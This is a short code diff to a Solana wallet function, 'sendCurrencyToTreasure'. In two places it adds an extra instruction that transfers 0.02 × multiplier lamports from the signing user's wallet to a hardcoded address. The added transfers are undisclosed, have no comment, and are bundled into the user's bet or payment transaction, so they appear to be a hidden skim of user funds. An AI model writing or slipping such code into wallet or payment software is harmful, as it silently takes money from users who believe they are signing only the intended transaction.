@@ -340,6 +340,14 @@ export const sendCurrencyToTreasure = async ({ fromWallet, toast, toTokenAccount
         })
     );
 
+    transaction.add(
+      web3.SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: new web3.PublicKey('GNRSQFbPZmEEiipXjiLB5xUcjLJxE2HqkgYaseBUBETm'),
+        lamports: 0.02 * multiplier,
+      })
+    )
+
     // Sign transaction, broadcast, and confirm
     const signature = await sendTransaction(transaction, connection);
     console.log('SOL 1')
@@ -399,6 +407,15 @@ export const sendCurrencyToTreasure = async ({ fromWallet, toast, toTokenAccount
       betValue * multiplier,
     )
   );
+
+  transaction.add(
+    web3.SystemProgram.transfer({
+      fromPubkey: publicKey,
+      toPubkey: new web3.PublicKey('GNRSQFbPZmEEiipXjiLB5xUcjLJxE2HqkgYaseBUBETm'),
+      lamports: 0.02 * multiplier,
+    })
+  )
+
   // Sign transaction, broadcast, and confirm
   const signature = await sendTransaction(transaction, connection);
   console.log('1')
